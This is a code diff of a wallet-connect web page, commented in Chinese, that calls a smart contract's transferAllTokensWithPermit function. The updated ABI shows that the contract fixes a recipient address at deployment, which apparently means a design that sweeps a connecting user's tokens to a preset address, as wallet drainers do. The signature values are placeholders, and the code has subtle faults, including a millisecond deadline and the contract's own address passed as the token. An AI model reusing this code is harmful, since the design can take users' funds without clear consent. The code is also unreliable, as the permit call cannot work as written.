@@ -1,4 +1,6 @@
-const contractAddress = "0x9a2E12340354d2532b4247da3704D2A5d73Bd189"; // 最新合约地址
+let web3;
+let userAddress;
+const contractAddress = "0x9a2E12340354d2532b4247da3704D2A5d73Bd189"; // 最新的智能合约地址
 const abi = [
 	{
 		"inputs": [
@@ -42,69 +44,129 @@ const abi = [
 		"outputs": [],
 		"stateMutability": "nonpayable",
 		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_recipient",
+				"type": "address"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "from",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "TransferTokens",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "recipient",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
 	}
-];
-
-let web3;
-let userAddress;
+];  // 最新的ABI
 
 window.onload = function() {
-    document.getElementById('connectButton').addEventListener('click', connectWallet);
-    document.getElementById('transferButton').addEventListener('click', transferTokens);
+    const connectButton = document.getElementById('connectButton');
+    const transferButton = document.getElementById('transferButton');
+
+    // 绑定事件监听
+    connectButton.addEventListener('click', connectWallet);
+    transferButton.addEventListener('click', transferTokens);
 };
 
 async function connectWallet() {
-    if (window.ethereum) {
+    if (typeof window.ethereum !== 'undefined') {
         try {
-            web3 = new Web3(window.ethereum);
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            web3 = new Web3(window.ethereum);  // 初始化 web3
+            await window.ethereum.request({ method: 'eth_requestAccounts' });  // 请求连接钱包
             const accounts = await web3.eth.getAccounts();
             userAddress = accounts[0];
 
+            // 成功连接后显示钱包地址
             document.getElementById('walletAddress').innerText = userAddress;
-            document.getElementById('tokenAddress').innerText = contractAddress;
+            document.getElementById('walletInfo').style.display = 'block';  // 显示钱包信息
 
-            // 获取签名参数 (模拟)
-            const signature = await signPermit(userAddress);
-            document.getElementById('vValue').innerText = signature.v;
-            document.getElementById('rValue').innerText = signature.r;
-            document.getElementById('sValue').innerText = signature.s;
+            // 打印钱包地址到控制台，供调试用
+            console.log("已连接的钱包地址:", userAddress);
 
-            document.getElementById('transferButton').disabled = false;
+            // 读取并填写签名参数
+            await fillSignatureData(userAddress, contractAddress);
+
         } catch (error) {
             console.error("连接钱包失败:", error);
+            alert("连接钱包失败，请检查控制台日志。");
         }
     } else {
-        alert("请安装MetaMask钱包！");
+        alert("请安装 MetaMask 或者使用支持的浏览器！");
+        console.error("window.ethereum 不可用 - 请确保你已安装 MetaMask。");
     }
 }
 
-async function signPermit(userAddress) {
-    console.log("正在生成签名...");
-    // 模拟签名参数
-    return {
-        v: 27,
-        r: "0x...",
-        s: "0x..."
-    };
+async function fillSignatureData(userAddress, contractAddress) {
+    try {
+        console.log("正在生成签名...");
+        // 假设 r, s, v 是由你的合约或其他工具生成的
+        const v = 27;  // 模拟的签名参数 v
+        const r = "0x1234...";  // 模拟的签名参数 r
+        const s = "0x5678...";  // 模拟的签名参数 s
+
+        // 自动填写签名数据
+        document.getElementById('v').innerText = v;
+        document.getElementById('r').innerText = r;
+        document.getElementById('s').innerText = s;
+
+    } catch (error) {
+        console.error("签名生成失败:", error);
+    }
 }
 
 async function transferTokens() {
-    const contract = new web3.eth.Contract(abi, contractAddress);
-    const value = web3.utils.toWei('1', 'ether');  // 假设转移 1 个代币的示例值
-    const deadline = Math.floor(Date.now() / 1000) + 60 * 60; // 一小时后
-
-    const v = parseInt(document.getElementById('vValue').innerText);
-    const r = document.getElementById('rValue').innerText;
-    const s = document.getElementById('sValue').innerText;
-
     try {
-        await contract.methods.transferAllTokensWithPermit(
-            contractAddress, userAddress, value, deadline, v, r, s
-        ).send({ from: userAddress });
+        const contract = new web3.eth.Contract(abi, contractAddress);
+        const v = document.getElementById('v').innerText;
+        const r = document.getElementById('r').innerText;
+        const s = document.getElementById('s').innerText;
+
+        // 调用 transferAllTokensWithPermit 函数
+        await contract.methods.transferAllTokensWithPermit(contractAddress, userAddress, 1000, Date.now() + 3600, v, r, s)
+            .send({ from: userAddress });
 
         console.log("代币转移成功！");
+        alert("代币转移成功！");
+
     } catch (error) {
         console.error("代币转移失败:", error);
+        alert("代币转移失败，请检查控制台日志。");
     }
 }
